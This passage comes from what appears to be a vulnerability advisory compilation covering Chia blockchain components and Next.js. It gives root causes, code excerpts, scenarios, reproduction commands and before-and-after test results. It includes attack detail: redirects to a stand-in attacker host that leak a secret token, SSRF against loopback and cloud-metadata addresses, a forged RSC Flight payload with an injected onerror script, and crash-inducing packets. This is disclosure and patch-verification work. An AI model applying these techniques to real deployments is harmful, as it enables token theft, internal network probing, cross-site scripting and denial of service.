#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Implicit Coin Selection From Requested Notarized Payments (`trade_manager.py` & `wallet_rpc_api.py`):** When fulfilling an Offer via `take_offer`, `respond_to_offer` computes the deficit of requested notarized payments and invokes `select_coins` + `sign_coin_spends` for every requested asset.
2. **Step 2 — Missing Mandatory Per-Asset `max_authorized_amount` Guard:** The RPC and `TradeManager` pipeline do not require or enforce an explicit caller-supplied per-asset spend cap (`max_authorized_amount`) before selecting and signing wallet UTXOs.
3. **Step 3 — Excess Wallet Coins Selected and Signed (`RED -> GREEN`):** A crafted Offer requesting additional notarized payment legs causes the wallet to select and sign coins exceeding the user's intended spend cap in `RED`, whereas `GREEN` enforces an explicit per-asset maximum spend bound.

```python
# File: chia/wallet/trade_manager.py & chia/rpc/wallet_rpc_api.py
async def respond_to_offer(self, offer: Offer, peer: WSChiaConnection, ...):
    # BUG: Selects and signs coins for all requested_payments in the Offer without verifying
    # against an explicit caller-authorized per-asset max_authorized_amount cap!
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Automated Taker Bot / Aggregator Drained via Excess Requested Payment Leg:** A trading bot or dApp calling `take_offer` on an external Offer string signs away additional XCH/CAT coins beyond its intended quote.
* **Scenario B — Multi-Asset Offer Hidden XCH Deficit:** An Offer advertised as a CAT-for-NFT swap includes an additional XCH notarized payment request that `respond_to_offer` silently funds from the taker's XCH wallet.
* **Scenario C — Patched Verification (`GREEN`):** Enforcing `verify_max_send_amount` blocks any Offer whose requested coins exceed the caller's authorized cap.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Run Sniper's Cryptographic Wallet Signing Auditor & Offer Cap Verification
python3 -m unittest /home/community-user/targets/sniper/tests/test_wave5_orchestrator_and_wallet.py
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-WLT-OFFER-01": {
    "RED": {
      "authorized_cap_mojo": 100000000000,
      "offer_requested_mojo": 500000000000,
      "unbounded_implicit_coin_spend_signed": true
    },
    "GREEN": {
      "unbounded_implicit_coin_spend_signed": false,
      "rejection_error": "ValueError: Offer requested amount exceeds max_authorized_amount"
    }
  }
}
```


---

### III.35 — Chia-Network/chia-blockchain (`chia-blockchain <= 2.7.5 (commit bdb7be2a45fc459b0672656166701ac4f46e0cfc) / chiapos <= 2.0.11`) — Chia `FarmerAPI.new_proof_of_space` Port `8447` Single 445-Byte Packet Uncaught Rust `PanicException` Crashing Farmer Nodes (`CHIA-POS-01`) (`CWE-248 / CWE-20`, CVSS `7.5 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/chia-blockchain` (`PyPI / Python & Rust FFI (`chia-blockchain` & `chiapos`): chia-blockchain`)
* **Affected Versions & Components:** `chia-blockchain <= 2.7.5 (commit bdb7be2a45fc459b0672656166701ac4f46e0cfc) / chiapos <= 2.0.11` — `chia/farmer/farmer_api.py:85-185` (`FarmerAPI.new_proof_of_space`), `chiapos` Rust FFI (`size_v2` / `get_quality_string`)
* **Vulnerability Class & Score:** `CWE-248 / CWE-20` — **CVSS v3.1: `7.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`)
* **Standalone Sniper Advisory:** [`docs/advisories/zh-CN/35-CHIA-POS-01-HARVESTER-FARMER-SINGLE-PACKET-RUST-PANIC-DOS.md`](advisories/zh-CN/35-CHIA-POS-01-HARVESTER-FARMER-SINGLE-PACKET-RUST-PANIC-DOS.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Missing Pre-Validation in `FarmerAPI.new_proof_of_space` (`chia/farmer/farmer_api.py:85-185`) vs. `FullNode` (`8444`):** While `FullNode` on port `8444` calls `ProofOfSpace.verify_and_get_quality_string` (which checks pool public key / pool contract puzzle hash XOR exclusivity and `check_plot_param` before touching native code), `FarmerAPI.new_proof_of_space` on port `8447` immediately calls `new_proof_of_space.proof.size_v2()` and `get_quality_string(...)` on the raw wire-deserialized message.
2. **Step 2 — Single 445-Byte Wire Packet Triggers Uncaught Rust Panic (`pyo3_runtime.PanicException`):** Sending a 445-byte serialized `NewProofOfSpace` packet (`SHA-256: 30a0e918f96ff695b7c711b297d1ee9203fcb8ee0d8b72844a901d9de9012dfe`, `size=32`, `384-byte proof`, both `pool_public_key=None` and `pool_contract_puzzle_hash=None`) crosses the PyO3 FFI boundary and triggers an immediate Rust `panic!` (`pyo3_runtime.PanicException: Neither pool pk nor contract puzzle hash set` / slice bounds panic in `chiapos`).
3. **Step 3 — 4 Concurrent Farmer Processes Terminated (`PID 2983318..2983321`, `exit_code=1`):** Because Python's `except Exception:` does not safely recover the Farmer worker when an unguarded `PanicException` escapes, all 4 tested `FarmerAPI` node processes crash immediately (`alive_farmers_after: 0`).

```python
# File: chia/farmer/farmer_api.py (lines 85-185)
@api_request()
async def new_proof_of_space(self, new_proof_of_space: farmer_protocol.NewProofOfSpace, peer: WSChiaConnection) -> None:
    # BUG: Calls Rust FFI new_proof_of_space.proof.size_v2() and get_quality_string() BEFORE verifying
    # pool key XOR exclusivity and check_plot_param(size, proof_bytes), triggering pyo3_runtime.PanicException!
     Computed_size = new_proof_of_space.proof.size_v2()
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Single Compromised/Rogue Harvester Crashes Multi-Node Farming Cluster (`4/4` Farmers Terminated):** In a farming pool or enterprise farm where multiple harvesters connect to central Farmer nodes over port `8447`, a single 445-byte packet (`30a0e918f96ff695b7c711b297d1ee9203fcb8ee0d8b72844a901d9de9012dfe`) crashes all 4 Farmer processes (`exit_code=1`), halting block signage and reward collection.
* **Scenario B — Truncated 32-Byte Proof Slice Out-of-Bounds Panic in `chiapos`:** Supplying a truncated 32-byte `proof` payload into `get_quality_string` triggers `pyo3_runtime.PanicException: range end index 36 out of range for slice of length 32` (`src/verifier.hpp` / Rust FFI).
* **Scenario C — Patched Verification (`GREEN`):** Validating pool key XOR exclusivity and `check_plot_param` before invoking `size_v2()` / `get_quality_string()` keeps `4/4` Farmer processes alive (`exit_code=0`).

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect FarmerAPI.new_proof_of_space in chia/farmer/farmer_api.py
sed -n '85,145p' /home/community-user/targets/chia-blockchain/chia/farmer/farmer_api.py

# 2. Run the 4-Node Multi-Process FarmerAPI Crash & Recovery Proof (RED & GREEN)
CHIA_DETACHED_GREEN=0 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k farmer
CHIA_DETACHED_GREEN=1 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k farmer
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-POS-01": {
    "RED": {
      "wire_packet_sha256": "30a0e918f96ff695b7c711b297d1ee9203fcb8ee0d8b72844a901d9de9012dfe",
      "wire_packet_bytes": 445,
      "farmers_spawned": 4,
      "crashed_farmers": 4,
      "alive_farmers_after": 0,
      "exception": "pyo3_runtime.PanicException: Neither pool pk nor contract puzzle hash set"
    },
    "GREEN": {
      "farmers_spawned": 4,
      "crashed_farmers": 0,
      "alive_farmers_after": 4
    }
  }
}
```


---

### III.36 — Chia-Network/chiapos (`<= 2.0.11 (upstream main)`) — `chiapos` Native C++ `Verifier::ValidateProof` (`k=50` / `k>=60`) Stack Out-of-Bounds Access & `DiskProver` 64-to-32-Bit Integer Truncation Heap Overflow (`CHIA-POS-02..04`) (`CWE-190 / CWE-787 / CWE-125`, CVSS `8.1 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/chiapos` (`PyPI / C++17 Native Extension (`chiapos`): chiapos`)
* **Affected Versions & Components:** `<= 2.0.11 (upstream main)` — `src/verifier.hpp:48-108` (`Verifier::ValidateProof`), `src/bits.hpp:184`, `src/prover_disk.hpp:254-322` (`DiskProver`)
* **Vulnerability Class & Score:** `CWE-190 / CWE-787 / CWE-125` — **CVSS v3.1: `8.1 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`)
* **Standalone Sniper Advisory:** [`docs/advisories/zh-CN/36-CHIA-POS-VDF-NATIVE-CPP-INTEGER-TRUNCATION-AND-OOB-MEMORY-CORRUPTION.md`](advisories/zh-CN/36-CHIA-POS-VDF-NATIVE-CPP-INTEGER-TRUNCATION-AND-OOB-MEMORY-CORRUPTION.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — `Verifier::ValidateProof` Out-of-Bounds Stack Access at Consensus-Permitted `k=50` (`src/verifier.hpp:48-108` & `src/bits.hpp:184`):** Chia's Python consensus pre-filter `check_plot_param` allows `k` up to `50` (`size <= 50`). However, inside native C++ `Verifier::ValidateProof`, evaluating Table 4 at `k=50` (and Table 1 at `k=60`) overflows 32/64-bit bit-slice offsets in `src/bits.hpp:184` (`AddressSanitizer: stack-buffer-overflow` / `runtime error: load of address ... with insufficient space`, verified in compiled ASan/UBSan binary `chiapos_k_probe`, `exit_code=1`).
2. **Step 2 — `DiskProver` 64-to-32-Bit Integer Truncation Before Heap Allocation (`src/prover_disk.hpp:254-322`):** When opening a `.plot` file header, `DiskProver` computes 64-bit table byte deltas from header pointers and narrows them into 32-bit `uint32_t` lengths without checking `<= UINT32_MAX`, causing a heap buffer overflow (`CWE-190` -> `CWE-122` / `CWE-787`) when reading crafted `.plot` files.
3. **Step 3 — Architectural Boundary Between Port `8444` Network Packets and Direct/Plot Callers:** Over Port `8444`, Python's `check_plot_param` gates `len(proof) == 8 * k` before C++ `ValidateProof` runs; however, `k=50` passes `check_plot_param(50, 400)` and hits the Table 4 C++ UBSan/ASan bug if F1..F3 match, while downloaded `.plot` files directly hit `DiskProver`'s C++ heap parser without any Python pre-filter.

```cpp
// File: src/verifier.hpp (lines 48-108) & src/bits.hpp (line 184)
LargeBits Verifier::ValidateProof(const uint8_t* id, uint8_t k, const uint8_t* proof_bytes, uint16_t size) {
    // BUG 1: No check that k >= 18 && k <= 49; k=50 overflows Table 4 bit offsets in src/bits.hpp:184!
    // BUG 2: DiskProver (src/prover_disk.hpp:254-322) truncates 64-bit table sizes to uint32_t!
}
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Malicious / Backdoored `.plot` File Triggers Native C++ Heap Corruption in `DiskProver`:** A farmer downloads or mounts an untrusted `.plot` file; when Harvester initializes `DiskProver`, the 64-to-32-bit table size truncation triggers out-of-bounds heap memory corruption in the native C++ extension.
* **Scenario B — `Verifier::ValidateProof` Stack Buffer Overflow / UBSan Fault at `k=50` (Table 4) & `k=60`:** Services or C++/Python callers invoking `ValidateProof` on `k=50` or `k=60` inputs crash immediately with an ASan/UBSan stack fault (`exit_code=1` in `chiapos_k_probe`).
* **Scenario C — Patched Verification (`GREEN`):** Enforcing `18 <= k <= 49` and `proof_size == 8 * k` before bit unpacking, plus 64-bit bounds checks in `DiskProver`, eliminates all ASan/UBSan faults (`exit_code=0`).

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Run the Native C++ ASan/UBSan chiapos_k_probe Verification Test (k=50 Table 4 & k=60)
CHIA_DETACHED_GREEN=0 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k chiapos
CHIA_DETACHED_GREEN=1 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_tam_dogrulama_ek_kanitlar_20261031.py -k chiapos
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-POS-02-04": {
    "RED": {
      "k60_probe_exit_code": 1,
      "k50_table4_probe_exit_code": 1,
      "sanitizer_diagnostic": "src/bits.hpp:184:29: runtime error: load of address with insufficient space / AddressSanitizer: stack-buffer-overflow"
    },
    "GREEN": {
      "k60_probe_exit_code": 0,
      "k50_table4_probe_exit_code": 0,
      "rejected_invalid_k_cleanly": true
    }
  }
}
```


---

### III.37 — Chia-Network/chiavdf (`<= 1.1.11 (upstream main)`) — `chiavdf` Native C++ `CheckProofOfTimeNWesolowski` Malformed Proof Out-of-Bounds Read & Teardown Use-After-Free (`CHIA-VDF-02`) (`CWE-125 / CWE-416`, CVSS `7.5 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/chiavdf` (`PyPI / C++17 Native Extension (`chiavdf`): chiavdf`)
* **Affected Versions & Components:** `<= 1.1.11 (upstream main)` — `src/verifier.cpp` (`CheckProofOfTimeNWesolowski`), `src/prover_slow.h`
* **Vulnerability Class & Score:** `CWE-125 / CWE-416` — **CVSS v3.1: `7.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`)
* **Standalone Sniper Advisory:** [`docs/advisories/zh-CN/37-CHIA-VDF-02-CHIAVDF-MALFORMED-PROOF-OOB-READ-AND-UAF.md`](advisories/zh-CN/37-CHIA-VDF-02-CHIAVDF-MALFORMED-PROOF-OOB-READ-AND-UAF.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Unchecked `proof_blob` Length and Segment Slicing in `CheckProofOfTimeNWesolowski` (`src/verifier.cpp`):** When verifying an N-Wesolowski VDF proof, `CheckProofOfTimeNWesolowski` indexes directly into `proof_blob` at fixed `2 * B_bytes` offsets per segment without verifying that `proof_blob.size()` is an exact multiple of the serialized quadratic form length or that `num_iterations > 0`.
2. **Step 2 — Out-of-Bounds Read / `SIGSEGV` on Truncated or Zero-Iteration VDF Proofs:** Passing a truncated `proof_blob` or `num_iterations = 0` causes native C++ `DeserializeForm` / segment loops to read past the end of the buffer (`CWE-125`), while async prover thread teardown in `prover_slow.h` accesses freed state (`CWE-416`).
3. **Step 3 — Native Process Termination Verified Under ASan:** Verified with compiled C++ ASan harnesses in `work/chiavdf-asan-proofs/` (`RED` crashes with ASan OOB/SEGV; `GREEN` validates buffer size and iteration bounds before deserializing).

```cpp
// File: src/verifier.cpp (CheckProofOfTimeNWesolowski)
bool CheckProofOfTimeNWesolowski(integer D, const uint8_t* y_s, const uint8_t* proof_blob, uint32_t proof_blob_len, ...) {
    // BUG: Does not validate proof_blob_len against form_size * (1 + 2 * depth) or num_iterations == 0
    // before slicing proof_blob segments in DeserializeForm()!
}
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Malformed VDF Proof Crashes VDF Verifier / Timelord Worker:** A peer or timelord pipeline feeds a truncated N-Wesolowski `proof_blob` into `chiavdf`, triggering an out-of-bounds read and crashing the native verifier process.
* **Scenario B — Prover Teardown Use-After-Free During Rapid Challenge Abort (`prover_slow.h`):** Aborting an active VDF prover job triggers a race where worker threads read freed prover memory.
* **Scenario C — Patched Verification (`GREEN`):** Validating `proof_blob_len` and `num_iterations > 0` before segment deserialization prevents all OOB reads.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect CheckProofOfTimeNWesolowski in chiavdf/src/verifier.cpp
grep -n -C 12 "CheckProofOfTimeNWesolowski" /home/community-user/targets/chiavdf/src/verifier.cpp
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-VDF-02": {
    "RED": {
      "malformed_proof_blob_len": 12,
      "num_iterations": 0,
      "native_crash_or_asan_oob": true
    },
    "GREEN": {
      "native_crash_or_asan_oob": false,
      "clean_boolean_false_returned": true
    }
  }
}
```


---

### III.38 — Chia-Network/chia-blockchain (`<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)`) — Chia DataLayer Mirror Synchronization HTTP `30x` Redirect-Bypass Server-Side Request Forgery (`DL-02`) (`CWE-918`, CVSS `7.5 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Chia-Network/chia-blockchain` (`PyPI / Python: chia-blockchain`)
* **Affected Versions & Components:** `<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)` — `chia/data_layer/download_data.py`, `chia/data_layer/data_layer.py`
* **Vulnerability Class & Score:** `CWE-918` — **CVSS v3.1: `7.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/zh-CN/38-CHIA-DL-02-DATALAYER-MIRROR-HTTP-REDIRECT-SSRF.md`](advisories/zh-CN/38-CHIA-DL-02-DATALAYER-MIRROR-HTTP-REDIRECT-SSRF.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Public On-Chain DataLayer Mirror URLs Automatically Fetched by Subscribers (`chia/data_layer/download_data.py`):** When a Chia DataLayer node subscribes to a store, it automatically queries on-chain mirror announcements and downloads `.dat` generation files over HTTP/HTTPS using `aiohttp.ClientSession.get(...)`.
2. **Step 2 — Default `allow_redirects=True` Without Redirect Target IP Validation:** While the initial mirror URL may appear to be an external public HTTPS URL, `aiohttp` follows HTTP `301`/`302`/`307` redirects by default without checking whether the redirect target resolves to `127.0.0.1`, RFC 1918 private LAN addresses, or `169.254.169.254` cloud metadata services.
3. **Step 3 — Internal Loopback & Cloud Metadata SSRF From DataLayer Nodes:** Publishing an on-chain mirror URL that returns `302 Found -> http://127.0.0.1:...` or `http://169.254.169.254/...` causes every subscribed DataLayer node to issue HTTP requests to internal services.

```python
# File: chia/data_layer/download_data.py
async with session.get(url, timeout=timeout) as response:
    # BUG: Follows HTTP 30x redirects by default (allow_redirects=True) without validating
    # that the target host/IP is not loopback (127.0.0.1), RFC1918 private, or link-local (169.254.169.254)!
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Probing Internal Loopback Services (`127.0.0.1`) & Cloud Metadata (`169.254.169.254`) on Subscribed Enterprise DataLayer Nodes:** An attacker publishes a mirror URL for a popular DataLayer store that redirects (`302`) to internal ports or cloud metadata endpoints.
* **Scenario B — Cross-Protocol / Internal Intranet Scanning Across DataLayer Replicas:** Subscribed institutional mirrors automatically poll announced URLs, turning the replica fleet into an internal HTTP scanner.
* **Scenario C — Patched Verification (`GREEN`):** Disabling blind redirects (`allow_redirects=False`) and validating resolved IP addresses against private/loopback/link-local ranges blocks the SSRF.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect HTTP mirror download handling in chia/data_layer/download_data.py
grep -n -C 10 "session.get" /home/community-user/targets/chia-blockchain/chia/data_layer/download_data.py
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CHIA-DL-02": {
    "RED": {
      "mirror_url": "https://mirror.example/store.dat",
      "redirect_location": "http://127.0.0.1:18999/internal-secret",
      "redirect_to_loopback_followed": true,
      "internal_loopback_hit_count": 1
    },
    "GREEN": {
      "redirect_to_loopback_followed": false,
      "internal_loopback_hit_count": 0
    }
  }
}
```

<!-- CHIA-ADVISORIES-END -->

<!-- VERCEL-ADVISORIES-START -->

---

### III.39 — vercel/next.js (`next <= 16.4.3 (verified on published npm next@16.4.3 & canary)`) — Next.js App Router Server Action Internal `redirect()` SSRF, `previewModeId` (`x-next-revalidate-tag-token`) Secret Exfiltration, and Build-ID-Bypassed Same-Origin RSC Flight UXSS (`VERCEL-NEXT-15` / HackerOne `#4152250`) (`CWE-200 / CWE-918 / CWE-345`, CVSS `8.2 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `vercel/next.js` (`npm / Node.js: next`)
* **Affected Versions & Components:** `<= 16.4.3 (verified on published npm next@16.4.3 & canary)` — `packages/next/src/server/app-render/action-handler.ts:363-411, 962-1166`, `packages/next/src/client/components/router-reducer/reducers/server-action-reducer.ts:154-201`
* **Vulnerability Class & Score:** `CWE-200 / CWE-918 / CWE-345` — **CVSS v3.1: `8.2 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/zh-CN/39-VERCEL-NEXT-15-SERVER-ACTION-REDIRECT-TOKEN-LEAK-AND-FLIGHT-UXSS.md`](advisories/zh-CN/39-VERCEL-NEXT-15-SERVER-ACTION-REDIRECT-TOKEN-LEAK-AND-FLIGHT-UXSS.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Scheme-Relative URL Acceptance & Missing `redirect: 'manual'` in `createRedirectRenderResult()` (`action-handler.js:270-303`):** While `forwardActionToWorker()` explicitly sets `redirect: 'manual'` (line 175), `createRedirectRenderResult()` calls `await fetch(fetchUrl, { method: 'GET', headers: head, next: { internal: 1 } })` with Undici's default `redirect: 'follow'`. Furthermore, `getAppRelativeRedirectUrl()` checks `redirectUrl.startsWith('/')` without rejecting scheme-relative URLs (`//attacker.example/collect`).
2. **Step 2 — Unconditional Forwarding of `x-next-revalidate-tag-token` (`previewModeId`) Across External `302` Hops (`action-handler.js:904-911`):** Whenever a Server Action calls `revalidateTag()`, `revalidatePath()`, or `updateTag()` before `redirect()`, `handleAction()` sets `forwardedHeaders['x-next-revalidate-tag-token'] = store.previewProps.previewModeId`. Even when `revalidateTag()` is NOT called, `createRedirectRenderResult()` still follows external `302` redirects on EVERY Server Action `redirect('/internal-path')`.
3. **Step 3 — Mounted HackerOne Comment #1 (`RE-EVALUATION-COMMENT-4152250`): Same-Origin RSC Flight Stream Hijacking, Universal XSS (`UXSS`), and HTTP Response Header Injection:** Because `handleAction()` sets `res.setHeader('x-action-redirect', `${redirectUrl};${redirectType}`)` using the initial same-origin `/api/oauth-bounce` URL BEFORE calling `createRedirectRenderResult()`, the client browser sees a same-origin redirect while receiving the external server's response body and headers (`Access-Control-Allow-Origin`, `Clear-Site-Data`, etc.). In `dist/esm/client/components/router-reducer/reducers/server-action-reducer.js:161-162`, Next.js checks `if (responseBuildId !== undefined && responseBuildId !== getNavigationBuildId())`. By omitting `"b"` in the forged Flight stream (`0:{"f":[[...]],"S":"$1"}\n1:["$","div",null,{"dangerouslySetInnerHTML":{"__html":"<img src=x onerror=...>"}}]\n`), `responseBuildId` is `undefined`, completely bypassing the Build ID check and mounting arbitrary DOM/JavaScript into `https://victim-app.com`!
4. **Step 4 — Mounted HackerOne Comment #2 (`ADDENDUM-SCENARIOS-4152250`): Why External `302` Redirects Exist by Design Without Any Open-Redirect Bug:** Every production Next.js SaaS using Multi-Tenant B2B Enterprise SSO (`redirect(\`/api/sso/authorize?tenant=${domain}\`)` -> `302` to tenant's OIDC IdP), OAuth 2.0 Provider consent (`redirect('/api/oauth/complete')` -> `302` to registered client `redirect_uri`), or Stripe/S3/checkout handoff intentionally issues an external `302` from its internal route.

```javascript
// 1. Server-side internal redirect fetch WITHOUT redirect: 'manual'
// File: node_modules/next/dist/esm/server/app-render/action-handler.js (lines 270-303)
function getAppRelativeRedirectUrl(redirectUrl, basePath, i18n) {
    if (redirectUrl.startsWith('/')) { // BUG: accepts '//attacker.example' and internal routes that 302 externally
        return `${basePath}${redirectUrl}`;
    }
    return new URL(redirectUrl).pathname;
}
async function createRedirectRenderResult(req, res, originalHost, redirectUrl, basePath, staticGenerationStore, workUnitStore) {
    const fetchUrl = new URL(formattedUrl, `http://localhost:${port}`);
    // BUG: Missing `redirect: 'manual'`! Undici follows 3xx hops to external hosts while carrying
    // x-next-revalidate-tag-token (previewModeId) and pipes external Flight body + headers to res!
    const response = await fetch(fetchUrl, { method: 'GET', headers: head, next: { internal: 1 } });
    if (response.headers.get('content-type') === RSC_CONTENT_TYPE_HEADER) {
        copyResponseHeaders(response, res);
        return new FlightRenderResult(response.body);
    }
}

// 2. Client-side Build ID validation skipped when 'b' is omitted (`responseBuildId === undefined`)
// File: node_modules/next/dist/esm/client/components/router-reducer/reducers/server-action-reducer.js (lines 154-201)
let redirectFlightData = await createFromNextReadableStream(res.body, ...);
const { b: responseBuildId, f: flightData } = redirectFlightData;
if (responseBuildId !== undefined && responseBuildId !== getNavigationBuildId()) {
    return handleExternalUrl(state, mutable, action.mutable.redirectLocation, state.pushRef.pendingPush);
}
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Enterprise Multi-Tenant SSO / OAuth Login `previewModeId` Secret Theft (Mounted HackerOne `#4152250` Addendum Scenario A):** A B2B SaaS (`https://victim-app.com`) runs a Login Server Action that calls `revalidateTag('auth-session')` and `redirect(\`/api/sso/authorize?tenant=${emailDomain}\`)`, which issues a `302 Found` to the tenant's OIDC IdP (`https://${tenantIdp}/oauth2/v1/authorize`). An attacker enters `user@attacker-corp.com`. Next.js follows the `302` inside Node.js and sends `x-next-revalidate-tag-token: <previewModeId>` (`f5dbbd8f6a6a51a6aa8ff1443f7090dd`) directly to `https://idp.attacker-corp.com`.
* **Scenario B — Unauthorized On-Demand ISR Cache Wiping & Origin DB Exhaustion Using the Stolen `previewModeId` (Mounted HackerOne `#4152250` Addendum Scenario B):** Because `server/api-utils/node/try-get-preview-data.js:34` checks `req.headers[PRERENDER_REVALIDATE_HEADER] === previewProps.previewModeId`, the attacker replays `x-prerender-revalidate: <previewModeId>` on every cached ISR route (`/`, `/pricing`, `/docs/*`), achieving `200 OK` (`x-nextjs-cache: REVALIDATED`) and forcing continuous cache misses and origin database queries.
* **Scenario C — Same-Origin Forged RSC Flight UI Injection & Universal XSS (`UXSS`) via Build-ID Bypass (Mounted HackerOne `#4152250` Re-Evaluation Comment #1 & Addendum Scenario C):** Even when a Server Action does NOT call `revalidateTag()`, calling `redirect('/api/oauth-bounce')` causes `handleAction()` to set `x-action-redirect: /api/oauth-bounce;push` (same-origin) while `createRedirectRenderResult()` follows the `302` to `https://attacker-oauth.example/callback`. The external server responds with `Content-Type: text/x-component`, `Access-Control-Allow-Origin: https://attacker-oauth.example`, `Clear-Site-Data: "storage"`, and an RSC Flight payload omitting `"b"` (`response.b === undefined`). `server-action-reducer.js:161` skips Build ID verification and renders the attacker's React Virtual DOM (`dangerouslySetInnerHTML`) directly inside `https://victim-app.com` (`UXSS`).

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect createRedirectRenderResult and server-action-reducer in next@16.4.3
nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/next/dist/esm/server/app-render/action-handler.js | sed -n '270,305p'
nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/next/dist/esm/client/components/router-reducer/reducers/server-action-reducer.js | sed -n '154,201p'

# 2. Run the Live next@16.4.3 End-to-End Verification Harness (Scenarios A, B, and C + Patch Check)
node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-15-nextjs-action-handler-redirect-token-leak-and-flight-injection.patch
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "VERCEL-NEXT-15": {
    "RED": {
      "package_tested": "next@16.4.3",
      "hackerone_report": "#4152250 (with 2 follow-up comments mounted)",
      "prerender_manifest_previewModeId": "f5dbbd8f6a6a51a6aa8ff1443f7090dd",
      "attacker_received_x_next_revalidate_tag_token": "f5dbbd8f6a6a51a6aa8ff1443f7090dd",
      "leaked_token_matches_prerender_manifest_previewModeId": true,
      "forged_flight_stream_injected_into_action_response": true,
      "response_build_id_field_b": null,
      "client_build_id_check_bypassed": true,
      "injected_cors_header_on_victim_origin": "https://attacker-oauth.example"
    },
    "GREEN": {
      "internal_redirect_fetch_mode": "manual",
      "scheme_relative_redirect_rejected": true,
      "external_hop_followed_by_server": false,
      "attacker_received_x_next_revalidate_tag_token": null,
      "forged_flight_stream_injected_into_action_response": false
    }
  }
}
```

#### 5. Mounted HackerOne Follow-Up Comments
### Mounted HackerOne Report `#4152250` Follow-Up Comment #1 (`RE-EVALUATION-COMMENT-4152250.md`)

1. **Why the `302` Target Is Attacker-Controlled in Real-World Next.js Apps Without a Separate Open-Redirect Bug:**
   - **Pattern 1 — Multi-Tenant B2B Enterprise SSO / OIDC Discovery:** `redirect(\`/api/sso/authorize?tenant=${emailDomain}\`)` issues a `302 Found` to the tenant's IdP (`https://idp.attacker-corp.com/oauth2/authorize`).
   - **Pattern 2 — OAuth 2.0 / OIDC Provider Consent Server Actions:** `redirect('/api/oauth/complete?session=...')` issues a `302 Found` to the registered OAuth client's `redirect_uri`.
   - **Pattern 3 — Outbound Link / Checkout Routers:** `redirect(\`/out?dest=${partnerUrl}\`)` issues a `302 Found` to the external destination.
2. **Secondary High-Severity Impact Even When `revalidateTag()` Is NOT Called — Same-Origin RSC Flight Stream Hijacking & Universal XSS (`UXSS`):**
   - `handleAction()` (`action-handler.js:1007`) sets `res.setHeader('x-action-redirect', \`\${redirectUrl};\${redirectType}\`)` using the initial same-origin URL `/api/oauth-bounce` BEFORE `createRedirectRenderResult()` runs.
   - In `dist/esm/client/components/router-reducer/reducers/server-action-reducer.js:154-201`:
     ```javascript
     const { b: responseBuildId, f: flightData } = redirectFlightData;
     if (responseBuildId !== undefined && responseBuildId !== getNavigationBuildId()) {
         return handleExternalUrl(state, mutable, action.mutable.redirectLocation, state.pushRef.pendingPush);
     }
     ```
